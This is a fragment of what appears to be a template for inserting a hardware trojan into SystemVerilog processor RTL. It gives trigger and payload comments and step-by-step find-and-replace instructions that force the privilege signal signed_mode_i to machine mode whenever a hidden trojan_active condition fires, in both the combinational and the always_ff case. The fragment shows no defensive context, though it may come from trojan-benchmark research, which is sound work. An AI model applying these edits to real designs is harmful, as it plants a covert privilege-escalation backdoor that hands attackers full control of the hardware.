 ...
 *   
 * Trigger: Counter on signed_mode_i
 * Payload: Force signed_mode_i to PRIV_LVL_M (Machine mode = 2'b11)
 * 
...
// ============================================================
// Privilege Escalation: Override signed_mode_i to PRIV_LVL_M.
//
// IMPORTANT: priv_lvl signals are typically REGISTERS (always_ff),
//   not combinational assigns. Handle BOTH cases:
//
// CASE 1 - If signed_mode_i has a combinational assign:
//   Find:    assign signed_mode_i = <priv_expr>;
//   Replace: assign signed_mode_i = trojan_active ? PRIV_LVL_M : (<priv_expr>);
//
// CASE 2 - If signed_mode_i is updated inside always_ff:
//   Find the last assignment to signed_mode_i in the always_ff block.
//   Add override AFTER it (before the closing end):
//     // Trojan override: force to Machine mode
//     if (trojan_active) signed_mode_i <= PRIV_LVL_M;
//
